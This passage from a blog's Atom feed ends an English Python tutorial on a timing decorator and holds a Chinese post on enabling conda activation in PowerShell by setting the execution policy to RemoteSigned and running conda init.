&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Function f1 run time: 1.0000762939453125
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Function f2 run time: 2.000044345855713
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;For the example above, 	we can try to use the assignment to simplify the operation.&lt;&#x2F;p&gt;
&lt;p&gt;But we can also use the decorator to get rid of it,then use the decorator:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-comment z-block z-documentation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-begin z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt; prints function time &lt;span class=&quot;z-punctuation z-definition z-comment z-end z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;function &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt; run time &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;%&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-sequence z-tuple z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__name__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-sequence z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-annotation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-annotation z-python&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-annotation z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-annotation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-annotation z-python&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-annotation z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; function f1 run time 1.0000762939453125  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; function f2 run time 2.000044345855713  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In this version, we use the &lt;code&gt;@timer&lt;&#x2F;code&gt; syntax to apply the decorator directly to the functions &lt;code&gt;f1&lt;&#x2F;code&gt; and &lt;code&gt;f2&lt;&#x2F;code&gt;. This is the power of decorators — it simplifies the process, making your code cleaner and more readable. This is what the virtue of the decorator.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;a class=&quot;zola-anchor&quot; href=&quot;#conclusion&quot; aria-label=&quot;Anchor link for: conclusion&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;As demonstrated, decorators offer a clean and efficient way to modify or extend the behavior of functions. By using decorators, you can easily add common functionality, like timing, logging, or validation, to multiple functions without repeating code. This makes your code more modular and maintainable.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>如何从powershell激活不同的anaconda环境</title>
		<published>2024-01-18T00:00:00+00:00</published>
		<updated>2024-01-22T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/condawindows/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/condawindows/</id>
		<content type="html">&lt;!-- ## 如何从powershell激活不同的anaconda环境 --&gt;
&lt;p&gt;​	因为自己一直用的是linux环境，最近终于删掉了双系统，改用wsl2了，不过我还是想体验一下windows下的python环境管理。一开始选择了uv，但这个时髦小玩意并没有一个好的换源方案，最后还是换成我熟悉的miniconda了。&lt;&#x2F;p&gt;
&lt;p&gt;​	但实际操作时却遇到了一个问题，比如当添加了script和bin的全局环境变量后，我依旧不能直接在powershell中直接激活我的conda环境。根据网上和官方文档所得知，需要&lt;code&gt;在管理员下取消powershell的脚本&lt;&#x2F;code&gt;执行策略，比如一开始脚本执行策略是restricted。在初次管理员下运行的时候会报错。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; class=&quot;language-powershell z-code&quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;Windows PowerShell
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;版权所有（C） Microsoft Corporation。保留所有权利。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;安装最新的 PowerShell，了解新功能和改进！https:&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;&#x2F;&lt;&#x2F;span&gt;aka.ms&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;&#x2F;&lt;&#x2F;span&gt;PSWindows
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-other z-powershell&quot;&gt;.&lt;&#x2F;span&gt; : 无法加载文件 C:\Users\&lt;span class=&quot;z-constant z-numeric z-integer z-powershell&quot;&gt;87897&lt;&#x2F;span&gt;\Documents\WindowsPowerShell\profile.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;阅 https:&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-function z-powershell&quot;&gt;go.microsoft.com&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;&#x2F;&lt;&#x2F;span&gt;fwlink&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;&#x2F;&lt;&#x2F;span&gt;?LinkID&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-powershell&quot;&gt;135170&lt;&#x2F;span&gt; 中的 about_Execution_Policies。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;所在位置 行:&lt;span class=&quot;z-constant z-numeric z-integer z-powershell&quot;&gt;1&lt;&#x2F;span&gt; 字符: &lt;span class=&quot;z-constant z-numeric z-integer z-powershell&quot;&gt;3&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-other z-powershell&quot;&gt;.&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-single z-powershell&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-powershell&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;C:\Users\87897\Documents\WindowsPowerShell\profile.ps1&lt;span class=&quot;z-punctuation z-definition z-string z-end z-powershell&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;+&lt;&#x2F;span&gt;   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;    &lt;span class=&quot;z-keyword z-operator z-assignment z-powershell&quot;&gt;+&lt;&#x2F;span&gt; CategoryInfo          : SecurityError: &lt;span class=&quot;z-punctuation z-section z-group z-begin z-powershell&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-interpolated z-simple z-source z-powershell&quot;&gt;:&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-powershell&quot;&gt;)&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-section z-bracket z-begin z-powershell&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-bracket z-end z-powershell&quot;&gt;]&lt;&#x2F;span&gt;，PSSecurityException
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;输入 &lt;code&gt;get-ExecutionPolicy&lt;&#x2F;code&gt; 输出 &lt;code&gt;Restricted&lt;&#x2F;code&gt;，即脚本执行策略受限。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; class=&quot;language-powershell z-code&quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;PS C:\Windows\system3&lt;span class=&quot;z-keyword z-operator z-redirection z-powershell&quot;&gt;2&amp;gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-function z-powershell&quot;&gt;get-ExecutionPolicy&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;Restricted
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里我们直接进行调整&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; class=&quot;language-powershell z-code&quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;PS C:\Windows\system3&lt;span class=&quot;z-keyword z-operator z-redirection z-powershell&quot;&gt;2&amp;gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-function z-powershell&quot;&gt;set-ExecutionPolicy&lt;&#x2F;span&gt; RemoteSigned
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;然后再次查看策略&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; class=&quot;language-powershell z-code&quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;PS C:\Users\HP&lt;span class=&quot;z-keyword z-operator z-redirection z-powershell&quot;&gt;&amp;gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-function z-powershell&quot;&gt;get-ExecutionPolicy&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;RemoteSigned
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;接下来我们运行&lt;code&gt;conda init powershell&lt;&#x2F;code&gt; ,然后退出，再次开启powershell，即可发现已经可以激活环境了。&lt;&#x2F;p&gt;
